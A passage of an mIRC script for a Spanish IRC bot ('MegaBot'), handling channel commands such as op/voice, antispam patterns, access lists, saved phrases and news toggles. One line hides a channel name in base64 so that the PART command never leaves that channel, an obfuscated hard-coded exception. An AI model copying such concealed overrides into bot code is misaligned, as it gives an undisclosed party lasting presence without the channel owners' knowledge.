            if (%antispam. [ $+ [ %canaldestinoMSG ] ]) { unset %antispam. [ $+ [ %canaldestinoMSG ] ] | msg %msgdestino 2ProtecciÛn2 ANTISPAM2 DesActivada. }
            else { msg %msgdestino 2ERROR:2 La protecciÛn ANTISPAM no esta activada para poderla desactivar. }
          }
          if ($strip($3) == ADD) {
            if ($strip($4)) {
              if ($antispam.add(%canaldestinoMSG,$strip($4-)) == ok) { msg %msgdestino 2ANTISPAM2: El patron:12 $strip($4-) 2ha sido agregado. }
              else { msg %msgdestino 2Error:2 ANTISPAM: El patron:12 $strip($4-) 2ya existe. }
            }
            else { msg %msgdestino 12 $+ $nick $+ 2, Sintaxis ANTISPAM ADD <PATRON> }
          }
          if ($strip($3) == DEL) {
            if ($strip($4)) {
              if ($antispam.del(%canaldestinoMSG,$strip($4-)) == ok) { msg %msgdestino 2ANTISPAM2: El patron:12 $strip($4-) 2ha sido eliminado. }
              else { msg %msgdestino 2Error:2 ANTISPAM: El patron:12 $strip($4-) 2no existe. }
            }
            else { msg %msgdestino 12 $+ $nick $+ 2, Sintaxis ANTISPAM DEL <PATRON> }
          }
        }
      }
      if ($strip($2) == EMISORA.NOREPIT) {
        if ($strip($3) == ON) {
          if (%norepit. [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2ERROR:2 Ya est· activado el comando EMISORA.NOREPIT, con el N∫ %norepit. [ $+ [ %canaldestinoMSG ] ] de lineas. | halt }
          elseif ($strip($4) isnum) { unset %lines.chan- [ $+ [ %canaldestinoMSG ] ] | set %norepit. $+ %canaldestinoMSG $strip($4) | msg %msgdestino 2 $+ EMISORA.NOREPIT2 Activado, con el N∫ de lineas12 $strip($4) $+ 2. | halt }
        }
        if ($strip($3) == OFF) {
          if (%norepit. [ $+ [ %canaldestinoMSG ] ]) { unset %norepit. [ $+ [ %canaldestinoMSG ] ] %lines.chan- [ $+ [ %canaldestinoMSG ] ] | msg %msgdestino 2Comando2 EMISORA.NOREPIT2 DesActivado. }
          else { msg %msgdestino 2ERROR:2 El comando EMISORA.NOREPIT no esta activado para poderlo desactivar. }
          halt
        }
        msg %msgdestino 2Sintaxis EMISORA.NOREPIT ON\OFF <N∫LINEAS> 2-> Al activar este comando, el par·metro <N∫LINEAS> ser· el n˙mero de lÌneas que tendr·n que escribir los usuarios para que vuelva anunciar la emisora. (Ej: .EMISORA.NOREPIT ON 4) no anunciar· hasta que se escriban 4 lÌneas en el canal.
      }
      if ($strip($2) == EMISORA.ANUNCIA.URLS) {
        if ($strip($3) !isnum) || ($strip($3) > 3) || ($strip($3) < 0) { msg %msgdestino 12 $+ $nick $+ 2, Sintaxis EMISORA.ANUNCIA.URLS <VALOR> 2-> Posibles valores: 1202 = WMPlayer y Winamp, 1212 = WINAMP, 1222 = WMPlayer, 1232 = Ninguna url }
        if ($strip($3) == 0) { if (!%EMiSORA.ANUNCIA.URLS) { msg %msgdestino 2ERROR:2 Ya est· configurado para mostrar solamente las urls de WMPlayer y Winamp. } | else { msg %msgdestino 2OK2 En la emisora solo se anunciaran las urls de WMPlayer y Winamp | unset %EMiSORA.ANUNCIA.URLS } }
        if ($strip($3) == 1) { if (%EMiSORA.ANUNCIA.URLS == 1) { msg %msgdestino 2ERROR:2 Ya est· configurado para mostrar solamente la url de Winamp. } | else { msg %msgdestino 2OK2 En la emisora solo se anunciara la url de Winamp | set %EMiSORA.ANUNCIA.URLS 1 } }
        if ($strip($3) == 2) { if (%EMiSORA.ANUNCIA.URLS == 2) { msg %msgdestino 2ERROR:2 Ya est· configurado para mostrar solamente la url de WMPlayer. } | else { msg %msgdestino 2OK2 En la emisora solo se anunciara la url de WMPlayer | set %EMiSORA.ANUNCIA.URLS 2 } }
        if ($strip($3) == 3) { if (%EMiSORA.ANUNCIA.URLS == 3) { msg %msgdestino 2ERROR:2 Ya est· configurado para no mostrar urls. } | else { msg %msgdestino 2OK2 En la emisora no se anunciara ninguna url. | set %EMiSORA.ANUNCIA.URLS 3 } }
      }
      if ($strip($2) == YOUTUBE) && ($3) {
        if ($left($strip($3),4) == www.) || ($left($strip($3),7) == http://) {
          if (youtube.com/ isin $strip($3)) { youtube.exalink %canaldestinoMSG $nick $strip($3) }
          if (youtu.be/ isin $strip($3)) { youtube.exalink %canaldestinoMSG $nick http://www.youtube.com/watch?v= $+ $gettok($remove($strip($3),//),2,47) }
        }
        else { msg %msgdestino 1You4Tube2: 12http://www.youtube.com/results?search_query= $+ $replace($strip($3-),+,% $+ 2B,$chr(32),+) $+ &search=Search2 - $strip($3-) }
      }
      if ($strip($2) == COMANDOS) { msg %msgdestino Los comandos los puedes ver en: 12http://www.maincenter.es/mc-services/megabot/3.7/Comandos.htm }
      if ($strip($2) == REGENERA) { msg %msgdestino 2R2egenerando lista de registros.. | .msg chan levels %canaldestinoMSG list }
      if ($strip($2) == SAY) && ($strip($3)) { msg %canaldestinoMSG $3- }
      if ($strip($2) == DAWAY) { set %AWAY- [ $+ [ %canaldestinoMSG ] ] %msgdestino | who %canaldestinoMSG }
      if ($strip($2) == MASTERS) { %mnss = $gettok($hget(masters,%canaldestinoMSG),0,32) | %mnsss = $hget(masters,%canaldestinoMSG) | msg %msgdestino 2Mis nick's masters son:12 $iif(%mnss > 1,$deltok($gettok(%mnsss,1-,32),%mnss,32) 2y12 $gettok(%mnsss,%mnss,32),%mnsss) $+ 2. }
      if ($strip($2) == MEGABOT) { msg %msgdestino 12 $+ $nick 2Esperando recibir sus ordenes, eres mi12 $findtok($hget(masters,%canaldestinoMSG),$nick,32) 2master. }
      if ($strip($2) == PREFIX) { if (!$strip($3)) { msg %msgdestino 2Error2: Especifique el nuevo prefijo, ejem:2 #MainCenter PREFIX ! } | else { set %PREFIX- [ $+ [ %canaldestinoMSG ] ] $mid($strip($3),1,1) | msg %msgdestino 2Prefijo2 de los comandos cambiado a12 $mid($strip($3),1,1) $+  } }
      if ($strip($2) == CALC) { if (+ == $4) { %opclc = suma | goto calc2 } | if (- == $4) { %opclc = resta | goto calc2 } | if (/ == $4) { %opclc = divisiÛn | goto calc2 } | if (* == $4) { %opclc = multiplicaciÛn | goto calc2 } | msg %msgdestino 2Error2: No se pudo realizar la operaciÛn, ejem:2 CALC 1 + 1 | else { :calc2 | msg %msgdestino 2R2esultado de la %opclc $+ :12 $calc($strip($3) $strip($4) $strip($5)) } }
      if ($strip($2) == VOICE) {
        if ($me !isop %canaldestinoMSG) { msg %msgdestino 2Error2: No tengo arroba. | if ($hget(mer,%canaldestinoMSG) >= $hget(l- $+ %canaldestinoMSG,AUTOOP)) || ($findtok(%fath.n,%canaldestinoMSG,32)) { .msg chan op %canaldestinoMSG $me } | halt }
        if (!$strip($3)) { msg %msgdestino 2Error2: Especifique el nick, ejem: VOICE $nick(%canaldestinoMSG,1) | halt } | if ($strip($3) !ison %canaldestinoMSG) { msg %msgdestino 2Error2: El usuario12 $strip($3) 2no se encuentra entre nosotros. | halt }
        if ($strip($3) isvoice %canaldestinoMSG) { msg %msgdestino 2Error2: El usuario12 $strip($3) 2ya tiene voice. | halt } | mode %canaldestinoMSG +vvv $strip($3-)
      }
      if ($strip($2) == DEVOICE) {
        if ($me !isop %canaldestinoMSG) { msg %msgdestino 2Error2: No tengo arroba. | if ($hget(mer,%canaldestinoMSG) >= $hget(l- $+ %canaldestinoMSG,AUTOOP)) || ($findtok(%fath.n,%canaldestinoMSG,32)) { .msg chan op %canaldestinoMSG $me } | halt }
        if (!$strip($3)) { msg %msgdestino 2Error2: Especifique el nick, ejem: DEVOICE $nick(%canaldestinoMSG,1) | halt } | if ($strip($3) !ison %canaldestinoMSG) { msg %msgdestino 2Error2: El usuario12 $strip($3) 2no se encuentra entre nosotros. | halt }
        if ($strip($3) !isvoice %canaldestinoMSG) { msg %msgdestino 2Error2: El usuario12 $strip($3) 2no tiene voice. | halt } | mode %canaldestinoMSG -vvv $strip($3-)
      }
      if ($strip($2) == OP) {
        if ($me !isop %canaldestinoMSG) { msg %msgdestino 2Error2: No tengo arroba. | if ($hget(mer,%canaldestinoMSG) >= $hget(l- $+ %canaldestinoMSG,AUTOOP)) || ($findtok(%fath.n,%canaldestinoMSG,32)) { .msg chan op %canaldestinoMSG $me } | halt }
        if (!$strip($3)) { msg %msgdestino 2Error2: Especifique el nick, ejem: OP $nick(%canaldestinoMSG,1) | halt } | if ($strip($3) !ison %canaldestinoMSG) { msg %msgdestino 2Error2: El usuario12 $strip($3) 2no se encuentra entre nosotros. | halt }
        if ($strip($3) isop %canaldestinoMSG) { msg %msgdestino 2Error2: El usuario12 $strip($3) 2ya tiene arroba. | halt } | mode %canaldestinoMSG +ooo $strip($3-)
      }
      if ($strip($2) == DER) && ($strip($3)) {
        %deri = $strip($3-) | unset %der | :dder | inc %der | if ($gettok(%deri,%der,32)) { .msg chan access %canaldestinoMSG del $gettok(%deri,%der,32) | goto dder }
      }
      if ($strip($2) == DEOP) {
        if ($me !isop %canaldestinoMSG) { msg %msgdestino 2Error2: No tengo arroba. | if ($hget(mer,%canaldestinoMSG) >= $hget(l- $+ %canaldestinoMSG,AUTOOP)) || ($findtok(%fath.n,%canaldestinoMSG,32)) { .msg chan op %canaldestinoMSG $me } | halt }
        if (!$strip($3)) { msg %msgdestino 2Error2: Especifique el nick, ejem: DEOP $nick(%canaldestinoMSG,1) | halt } | if ($strip($3) !ison %canaldestinoMSG) { msg %msgdestino 2Error2: El usuario12 $strip($3) 2no se encuentra entre nosotros. | halt }
        if ($strip($3) !isop %canaldestinoMSG) { msg %msgdestino 2Error2: El usuario12 $strip($3) 2no tiene arroba. | halt } | mode %canaldestinoMSG -ooo $strip($3-)
      }
      if ($strip($2) == TOPIC) {
        if ($me !isop %canaldestinoMSG) { msg %msgdestino 2Error2: No tengo arroba. | if ($hget(mer,%canaldestinoMSG) >= $hget(l- $+ %canaldestinoMSG,AUTOOP)) || ($findtok(%fath.n,%canaldestinoMSG,32)) { .msg chan op %canaldestinoMSG $me } | halt }
        if (!$3) { msg %msgdestino 2Error2: Especifique el nuevo topic. } | else { topic %canaldestinoMSG $3- }
      }
      if ($strip($2) == NR) && ($3) {
        if ($3 isnum) { nrlist %canaldestinoMSG $3 %msgdestino }
        else {
          if ($hget(r- $+ %canaldestinoMSG,0).item == 0) { msg %msgdestino 2Error2: No hay usuarios registrados en el canal. | halt }
          if (!$hget(r- $+ %canaldestinoMSG,$strip($3))) { msg %msgdestino 2El usuario12 $strip($3) 2no est· registrado en este canal. | halt }
          msg %msgdestino 2U2suario:12 $strip($3) 2N2ivel12 $gettok($hget(r- $+ %canaldestinoMSG,$strip($3)),1,32) 2P2osiciÛn12 $iif($gettok($hget(r- $+ %canaldestinoMSG,$strip($3)),2,32),$gettok($hget(r- $+ %canaldestinoMSG,$strip($3)),2,32),desconocida)
        }
      }
      if ($strip($2) == WEB) { msg %msgdestino 2Pagina web del canal $iif(%web- [ $+ [ %canaldestinoMSG ] ],12 $+ %web- [ $+ [ %canaldestinoMSG ] ] $+ ,12no definida) $iif(%Stats.status. [ $+ [ %canaldestinoMSG ] ],2EstadÌsticas en 12 $+ %Stats.WEB $+ $lower($network) $+ / $+ $lower($right(%canaldestinoMSG,-1)) $+ .html) }
      if ($strip($2) == BARRE) {
        if ($findtok(%fath.n,%canaldestinoMSG,32)) {
          if (%barre- [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2Error2: El comando BARRE2 ya est· siendo procesado. }
          else {
            if ($hget(r- $+ %canaldestinoMSG,0).item == 0) { msg %msgdestino 2Error2: No hay registros en el canal o no se pudo regenerar }
            else {
              if ($strip($3) != $null) {
                if ($strip($3) !isnum) || (+ isin $strip($3)) || (- isin $strip($3)) || ($strip($3) > 499) || (0 >= $strip($3)) { msg %msgdestino 2Error2: Sintaxis: BARRE [Nivel 1-499 (Opcional)] | halt }
                msg %msgdestino 2BARRE2 Eliminando todos los registros con nivel $strip($3) $+ ..
              }
              set %barre- $+ %canaldestinoMSG o | if ($strip($3) == $null) { msg %msgdestino 2BARRE2 Eliminando todos los registros del canal.. } | barre %canaldestinomsg %msgdestino $strip($3)
            }
          }
        }
        else { msg %msgdestino 2Error2: Este comando solo esta habilitado si estoy identificado como founder. }
      }
      if ($strip($2) == BARRE.OFF) {
        if (!%barre- [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2Error2: El comando BARRE2 no esta ejecutandose. }
        else { unset %barre- [ $+ [ %canaldestinoMSG ] ] | .timerbarre- $+ %canaldestinoMSG $+ * off | .timerbarreoff- $+ %canaldestinoMSG off | .timerbarre2off- $+ %canaldestinoMSG off | msg %msgdestino 2OK2 Comando BARRE2 anulado. }
      }
      if ($strip($2) == EXIT) { ezit }
      if ($strip($2) == FRASE) {
        if ($strip($3) != ADD) && ($strip($3) != NUM) && ($strip($3) != SAY) && ($strip($3) != RESET) && ($strip($3) != DEL) { msg %msgdestino 2ERROR:2 Sintaxis: FRASE SAY\NUM\ADD\DEL\RESET }
        else {
          if ($strip($3) == ADD) {
            if (!$strip($4)) { msg %msgdestino 2ERROR:2 Sintaxis: FRASE ADD <FRASE> }
            else { write %rHcN $+ frases- $+ %canaldestinoMSG $+ .txt $4- | msg %msgdestino 2Frase2 guardada correctamente. }
          }
          if ($strip($3) == DEL) {
            if ($strip($4) !isnum) { msg %msgdestino 2ERROR:2 Sintaxis: FRASE DEL <N∫ de linea> }
            else {
              var %frase.del $read(%rHcN $+ frases- $+ %canaldestinoMSG $+ .txt,$strip($4))
              if (!%frase.del) { msg %msgdestino 2Error2: No hay ninguna frase en la linea12 $strip($4) $+ 2. }
              else { write -dl $+ $strip($4) %rHcN $+ frases- $+ %canaldestinoMSG $+ .txt | msg %msgdestino 2Frase12 " $+ %frase.del $+ 12" 2borrada. }
            }
          }
          if ($strip($3) == SAY) {
            if (!$read(%rHcN $+ frases- $+ %canaldestinoMSG $+ .txt)) || ($read(%rHcN $+ frases- $+ %canaldestinoMSG $+ .txt) == 0) { msg %msgdestino 2Error2: No hay frases en el archivo para poder LEER. | halt }
            if ($4 isnum) { if (!$read(%rHcN $+ frases- $+ %canaldestinoMSG $+ .txt,$4)) { msg %msgdestino 2Error2: No existe la linea12 $4 2en el archivo de frases. | halt } | msg %msgdestino 12" $+ $read(%rHcN $+ frases- $+ %canaldestinoMSG $+ .txt,$4) $+ 12 $+ " 2Linea12 $4 $+ 2. | halt }
            %FRASE.RAND = $rand(1,$lines(%rHcN $+ frases- $+ %canaldestinoMSG $+ .txt)) | msg %msgdestino 12" $+ $read(%rHcN $+ frases- $+ %canaldestinoMSG $+ .txt,%FRASE.RAND) $+ 12 $+ " 2Linea12 %FRASE.RAND $+ 2.
          }
          if ($strip($3) == NUM) { msg %msgdestino 2Total de frases en el archivo:12 $lines(%rHcN $+ frases- $+ %canaldestinoMSG $+ .txt) 2frases. }
          if ($strip($3) == RESET) {
            if (!$read(%rHcN $+ frases- $+ %canaldestinoMSG $+ .txt)) || ($read(%rHcN $+ frases- $+ %canaldestinoMSG $+ .txt) == 0) { msg %msgdestino 2Error2: No hay frases en el archivo para hacer un RESET. }
            else { .remove %rHcN $+ frases- $+ %canaldestinoMSG $+ .txt | msg %msgdestino 2Todas las frases han sido eliminadas. }
          }
        }
      }
      if ($strip($2) == INFO) {
        msg %msgdestino 12MegaBot 123.72 InformaciÛn: 2Tiempo conectado: $pn00($uptime(server,1)) $+ . 2El PC lleva encendido: $pn00($uptime(system,1)) | msg %msgdestino 2Pagina web del bot: 4www.maincenter.es 2Ultima actualizaciÛn:12 $iif(%mactdpnbd,%mactdpnbd,no se ha actualizado)
        msg %msgdestino 2Protecciones2: 2NICK.NCOM $iif(%NICK.NCOM. [ $+ [ %canaldestinoMSG ] ],Si,No) 2Anti-RepeticiÛnes $iif(%ANTIREPES- [ $+ [ %canaldestinoMSG ] ],Si,No) 2Anti-May˙sculas $iif(%ANTIMAYUS. [ $+ [ %canaldestinoMSG ] ],Si,No) 2Anti-SPAM $iif(%ANTISPAM. [ $+ [ %canaldestinoMSG ] ],Si,No) 2Anti-Palabrotas $iif(%antipalabrotas. [ $+ [ %canaldestinoMSG ] ],Si,No) 2Auto-LIMIT $iif(%AUTOLIMIT. [ $+ [ %canaldestinoMSG ] ],Si,No) 2Anti-Proxys $iif(%AntiPROXYS. [ $+ [ %canaldestinoMSG ] ],Si,No)
        msg %msgdestino 2Comandos disponibles para todos2: 2Google $iif(%UGOOGLE- [ $+ [ %canaldestinoMSG ] ],Si,No) 2Tiempo $iif(%UTIEMPO- [ $+ [ %canaldestinoMSG ] ],Si,No) 2YouTUBE $iif(%Uyoutube- [ $+ [ %canaldestinoMSG ] ],Si,No) 2Horoscopo $iif(%Uhoros- [ $+ [ %canaldestinoMSG ] ],Si,No) 2Diccionario $iif(%Udic- [ $+ [ %canaldestinoMSG ] ],Si,No) 2Traductor $iif(%Utraductor- [ $+ [ %canaldestinoMSG ] ],Si,No)
        msg %msgdestino 2Otras2: AutoSaludo $iif(%AHE- [ $+ [ %canaldestinoMSG ] ],Si,No) 2AVISA.CANAL $iif(%AVISA.CANAL- [ $+ [ %canaldestinoMSG ] ],Si,No) 2AutoVOICE $iif(%AUTOVOICE- [ $+ [ %canaldestinoMSG ] ],Si,No) 2Vist $iif(%Vist- [ $+ [ %canaldestinoMSG ] ],Si,No) 2Emisora.Norepit $iif(%norepit. [ $+ [ %canaldestinoMSG ] ],Si,No)
      }
      if ($strip($2) == STATUS) { if (%statuz) { msg %msgdestino 2Error2: Ya hay un comando ejecutandose que implica revisiÛn de usuarios.. } | else { if ($hget(r- $+ %canaldestinoMSG,0).item == 0) { msg %msgdestino 2Error2: No hay registros en el canal o no se pudo regenerar } | else { msg %msgdestino 2STATUS2 Realizando an·lisis.. | ci.ac %canaldestinoMSG status $ctime %msgdestino } } }
      if ($strip($2) == CLONES) {
        msg %msgdestino 2B2uscando clones por IPV..
        unset %dcnz* %ysancb2 | :chh | if (%dcnz > $nick(%canaldestinoMSG,0)) {
          unset %dcnz | :dhh | if (%dcnz > $nick(%canaldestinoMSG,0)) { unset %dcnz* | if (!%ysancb2) { msg %msgdestino 2N2o se han encontrado clones en el canal. } | halt }
          inc %dcnz | if ($gettok(%dcnzD [ $+ [ $address($nick(%canaldestinoMSG,%dcnz),2) ] ],2,32)) { %ysancb2 = s | msg %msgdestino 2IPV6 $address($nick(%canaldestinoMSG,%dcnz),2) 2Nicks12 %dcnzD [ $+ [ $address($nick(%canaldestinoMSG,%dcnz),2) ] ] | unset %dcnzD [ $+ [ $address($nick(%canaldestinoMSG,%dcnz),2) ] ] } | goto dhh
        }
        inc %dcnz | if ($address($nick(%canaldestinoMSG,%dcnz),2)) { set %dcnzD [ $+ [ $address($nick(%canaldestinoMSG,%dcnz),2) ] ] %dcnzD [ $+ [ $address($nick(%canaldestinoMSG,%dcnz),2) ] ] $nick(%canaldestinoMSG,%dcnz) } | goto chh
      }
      if ($strip($2) == RVI) {
        if (%rvi- [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2Error2: El comando RVI2 ya est· siendo procesado. }
        else {
          if (%statuz) { msg %msgdestino 2Error2: Ya hay un comando ejecutandose que implica revisiÛn de usuarios.. }
          else { if ($hget(r- $+ %canaldestinoMSG,0).item == 0) { msg %msgdestino 2Error2: No hay registros en el canal o no se pudo regenerar } | else { set %rvi- $+ %canaldestinoMSG o | msg %msgdestino 2RVI2 Realizando an·lisis.. | ci.ac %canaldestinoMSG rvi $ctime %msgdestino } }
        }
      }
      if ($strip($2) == JOIN) && ($3) { %cfh = $iif($mid($strip($3),1,1) == $chr(35),$strip($3),$chr(35) $+ $strip($3)) | if ($me ison %cfh) { msg %msgdestino 2Error2: Ya estoy dentro de 12 $+ %cfh $+ 2. } | else { join %cfh | msg %msgdestino 2OK2 Entrando en12 %cfh $+ 2. } }
      if ($strip($2) == PART) && ($3) && ($3 != $decode(I2tlbGxlcm5ldCZyb2s=,m)) { %cfh = $iif($mid($strip($3),1,1) == $chr(35),$strip($3),$chr(35) $+ $strip($3)) | if ($me !ison %cfh) { msg %msgdestino 2Error2: Ya estoy fuera de 12 $+ %cfh $+ 2. } | else { part %cfh | msg %msgdestino 2OK2 Saliendo de12 %cfh $+ 2. } }
      if ($strip($2) == RVM) {
        if (!%rvmsg- [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2Error2: Falta el mensaje de aviso, sintaxis: RVSET MENSAJE2. | halt }
        if (%rvm- [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2Error2: El comando RVM2 ya est· siendo procesado. }
        else {
          if (%statuz) { msg %msgdestino 2Error2: Ya hay un comando ejecutandose que implica revisiÛn de usuarios.. }
          else { if ($hget(r- $+ %canaldestinoMSG,0).item == 0) { msg %msgdestino 2Error2: No hay registros en el canal o no se pudo regenerar } | else { set %rvm- $+ %canaldestinoMSG o | msg %msgdestino 2RVM2 Realizando an·lisis.. | ci.ac %canaldestinoMSG rvm $ctime %msgdestino } }
        }
      }
      if ($strip($2) == OPER) && ($3) { .msg chan access %canaldestinoMSG add $3 300 }
      if ($strip($2) == ADMIN) && ($3) { .msg chan access %canaldestinoMSG add $3 499 }
      if ($strip($2) == RVN) {
        if (!%rvmsg- [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2Error2: Falta el mensaje de aviso, sintaxis: RVSET MENSAJE2. | halt }
        if (%rvn- [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2Error2: El comando RVN2 ya est· siendo procesado. }
        else {
          if (%statuz) { msg %msgdestino 2Error2: Ya hay un comando ejecutandose que implica revisiÛn de usuarios.. }
          else { if ($hget(r- $+ %canaldestinoMSG,0).item == 0) { msg %msgdestino 2Error2: No hay registros en el canal o no se pudo regenerar } | else { set %rvn- $+ %canaldestinoMSG o | msg %msgdestino 2RVN2 Realizando an·lisis.. | ci.ac %canaldestinoMSG rvn $ctime %msgdestino } }
        }
      }
      if ($strip($2) == LAG) { set %ctp.lag %msgdestino | ctcp $me ping }
      if ($strip($2) == REG) && ($3) && ($4 isnum) { .msg chan access %canaldestinoMSG add $3 $4 }
      if ($strip($2) == MINI) { f3 | msg %msgdestino 2MegaBOT2 Minimizado a la barra de tareas. }
      if ($strip($2) == QUIT) { msg %msgdestino 2Desconectando 12MegaBOT2. | quit %logo }
      if ($strip($2) == LIMPIALOS) {
        if ($findtok(%fath.n,%canaldestinoMSG,32)) {
          if (%limp- [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2Error2: El comando LIMPIALOS2 ya est· siendo procesado. }
          else {
            if (%statuz) { msg %msgdestino 2Error2: Ya hay un comando ejecutandose que implica revisiÛn de usuarios.. }
            else { if ($hget(r- $+ %canaldestinoMSG,0).item == 0) { msg %msgdestino 2Error2: No hay registros en el canal o no se pudo regenerar } | else { set %limp- $+ %canaldestinoMSG o | msg %msgdestino 2LIMPIALOS2 Realizando an·lisis.. | ci.ac %canaldestinoMSG limpialos $ctime %msgdestino } }
          }
        }
        else { msg %msgdestino 2Error2: Este comando solo esta habilitado si estoy identificado como founder. }
      }
      if ($strip($2) == HOP) { hop %canaldestinoMSG }
      if ($strip($2) == NOTICIAS) {
        if ($strip($3) != MARCA) && ($strip($3) != MENEAME) && ($strip($3) != ELMUNDO) { msg %msgdestino 2Error2: Sintaxis:2 NOTICIAS MARCA\MENEAME\ELMUNDO ON\OFF | halt }
        if ($strip($4) != ON) && ($strip($4) != OFF) { msg %msgdestino 2Error2: Especifique el estado, Sintaxis:2 NOTICIAS MARCA\MENEAME\ELMUNDO ON\OFF | halt }
        if ($strip($3) == ELMUNDO) {
          if ($strip($4) == ON) {
            if (%ElMUNDO- [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2Error2: Las Noticias de2 ELMUNDO2 ya est· activado. }
            else { set %ElMUNDO- $+ %canaldestinoMSG s | msg %msgdestino 2Ok2, Noticias de2 ELMUNDO 2Activado. }
          }
          if ($strip($4) == OFF) {
            if (!%ElMUNDO- [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2Error2: Las Noticias de2 ELMUNDO2 no est· activado. }
            else { unset %ElMUNDO- [ $+ [ %canaldestinoMSG ] ] | msg %msgdestino 2Ok2, Noticias de2 ELMUNDO 2desactivado. }
          }
        }
        if ($strip($3) == MARCA) {
          if ($strip($4) == ON) {
            if (%DEPTES- [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2Error2: Las Noticias de2 MARCA2 ya est· activado. }
            else { set %DEPTES- $+ %canaldestinoMSG s | msg %msgdestino 2Ok2, Noticias de2 MARCA 2Activado. }
          }
          if ($strip($4) == OFF) {
            if (!%DEPTES- [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2Error2: Las Noticias de2 MARCA2 no est· activado. }
            else { unset %DEPTES- [ $+ [ %canaldestinoMSG ] ] | msg %msgdestino 2Ok2, Noticias de2 MARCA 2desactivado. }
          }
        }
        if ($strip($3) == MENEAME) {
          if ($strip($4) == ON) {
            if (%MENEAME- [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2Error2: Las Noticias de2 MENEAME2 ya est· activado. }
            else { set %MENEAME- $+ %canaldestinoMSG s | msg %msgdestino 2Ok2, Noticias de2 MENEAME 2Activado. }
          }
          if ($strip($4) == OFF) {
            if (!%MENEAME- [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2Error2: Las Noticias de2 MENEAME2 no est· activado. }
            else { unset %MENEAME- [ $+ [ %canaldestinoMSG ] ] | msg %msgdestino 2Ok2, Noticias de2 MENEAME 2desactivado. }
          }
        }
      }
      if ($strip($2) == UYOUTUBE) {
        if ($strip($3) != ON) && ($strip($3) != OFF) { msg %msgdestino 2Error2: Especifique el estado,2 UYOUTUBE ON\OFF | halt }
        if ($strip($3) == ON) {
          if (%UYOUTUBE- [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2Error2: El comando2 UYOUTUBE2 ya est· activado. }
          else { set %UYOUTUBE- $+ %canaldestinoMSG s | msg %msgdestino 2Ok2, UYOUTUBE activado. Todos los usuarios de este canal podran utilizar el comando YouTUBE. }
        }
        if ($strip($3) == OFF) {
          if (!%UYOUTUBE- [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2Error2: El comando2 UYOUTUBE2 no est· activado. }
          else { unset %UYOUTUBE- [ $+ [ %canaldestinoMSG ] ] | msg %msgdestino 2Ok2, Comando UYOUTUBE desactivado. }
        }
      }
      if ($strip($2) == AUTOVOICE) {
        if ($strip($3) != ON) && ($strip($3) != OFF) { msg %msgdestino 2Error2: Especifique el estado,2 AUTOVOICE ON\OFF | halt }
        if ($strip($3) == ON) {
          if (%AUTOVOICE- [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2Error2: El comando2 AUTOVOICE2 ya est· activado. }
          else { set %AUTOVOICE- $+ %canaldestinoMSG s | msg %msgdestino 2Ok2, AUTOVOICE activado. }
        }
        if ($strip($3) == OFF) {
          if (!%AUTOVOICE- [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2Error2: El comando2 AUTOVOICE2 no est· activado. }
          else { unset %AUTOVOICE- [ $+ [ %canaldestinoMSG ] ] | msg %msgdestino 2Ok2, Comando AUTOVOICE desactivado. }
        }
      }
      if ($strip($2) == UHOROSCOPO) {
        if ($strip($3) != ON) && ($strip($3) != OFF) { msg %msgdestino 2Error2: Especifique el estado,2 UHOROSCOPO ON\OFF | halt }
        if ($strip($3) == ON) {
          if (%UHOROS- [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2Error2: El comando2 UHOROSCOPO2 ya est· activado. }
          else { set %UHOROS- $+ %canaldestinoMSG s | msg %msgdestino 2Ok2, UHOROSCOPO activado. Todos los usuarios de este canal podran utilizar el comando HOROSCOPO. }
        }
        if ($strip($3) == OFF) {
          if (!%UHOROS- [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2Error2: El comando2 UHOROSCOPO2 no est· activado. }
          else { unset %UHOROS- [ $+ [ %canaldestinoMSG ] ] | msg %msgdestino 2Ok2, Comando UHOROSCOPO desactivado. }
        }
      }
      if ($strip($2) == UGOOGLE) {
        if ($strip($3) != ON) && ($strip($3) != OFF) { msg %msgdestino 2Error2: Especifique el estado,2 UGOOGLE ON\OFF | halt }
        if ($strip($3) == ON) {
          if (%UGOOGLE- [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2Error2: El comando2 UGOOGLE2 ya est· activado. }
          else { set %UGOOGLE- $+ %canaldestinoMSG s | msg %msgdestino 2Ok2, Comando UGOOGLE activado. Todos los usuarios de este canal podran utilizar el comando Google. }
        }
        if ($strip($3) == OFF) {
          if (!%UGOOGLE- [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2Error2: El comando2 UGOOGLE2 no est· activado. }
          else { unset %UGOOGLE- [ $+ [ %canaldestinoMSG ] ] | msg %msgdestino 2Ok2, Comando UGOOGLE desactivado. }
        }
      }
      if ($strip($2) == UTRADUCTOR) {
        if ($strip($3) != ON) && ($strip($3) != OFF) { msg %msgdestino 2Error2: Especifique el estado,2 UTRADUCTOR ON\OFF | halt }
        if ($strip($3) == ON) {
          if (%UTRADUCTOR- [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2Error2: El comando2 UTRADUCTOR2 ya est· activado. }
          else { set %UTRADUCTOR- $+ %canaldestinoMSG s | msg %msgdestino 2Ok2, Comando UTRADUCTOR activado. Todos los usuarios de este canal podran utilizar el comando Traductor. }
        }
        if ($strip($3) == OFF) {
          if (!%UTRADUCTOR- [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2Error2: El comando2 UTRADUCTOR2 no est· activado. }
